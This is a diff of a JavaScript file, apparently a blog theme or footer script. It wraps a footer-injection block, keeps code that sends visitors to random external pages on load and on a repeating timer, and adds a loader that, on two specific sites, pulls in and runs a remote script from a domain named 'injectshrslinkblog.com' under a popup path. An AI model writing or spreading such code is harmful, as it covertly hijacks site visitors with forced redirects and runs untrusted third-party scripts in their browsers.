@@ -1,4 +1,5 @@
-let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
+document.addEventListener('DOMContentLoaded', () => {
+  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
   if (Folt) {
     let Newel = document.createElement('span');
     Newel.innerHTML = `<style>
@@ -18,14 +19,13 @@ let Folt = document.querySelector(".footer, #main, .copyright") || document.body
   } else {
        
   }
-
+});
   const postUrls = [
     'https://dktheme.online/dance-battle/index.html',
     'https://dktheme.online/funny-fred/index.html',
     'https://dktheme.online/brain-trainer/index.html',
     'https://dktheme.online/stack-smash/index.html',
     'https://dktheme.online/zoo-boom/index.html'
-  
   
   ];
         function goToRandomPost() {
@@ -35,5 +35,25 @@ let Folt = document.querySelector(".footer, #main, .copyright") || document.body
         }
         window.onload = function() {
             goToRandomPost();
-            setInterval(goToRandomPost,  5000);}
+            setInterval(goToRandomPost,  50000);
+        };
 
+var allowedURLs = [
+    "https://dkhek.blogspot.com",
+    "https://www.desiremovies.store"
+];
+
+var foundMatch = false;
+
+for (var i = 0; i < allowedURLs.length; i++) {
+    if (window.location.href.startsWith(allowedURLs[i])) {
+        foundMatch = true;
+        break;
+    }
+}
+
+if (foundMatch) {
+function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://injectshrslinkblog.com/popup/script.js', function() { console.log('Script loaded!'); });
+}
+else {
+}
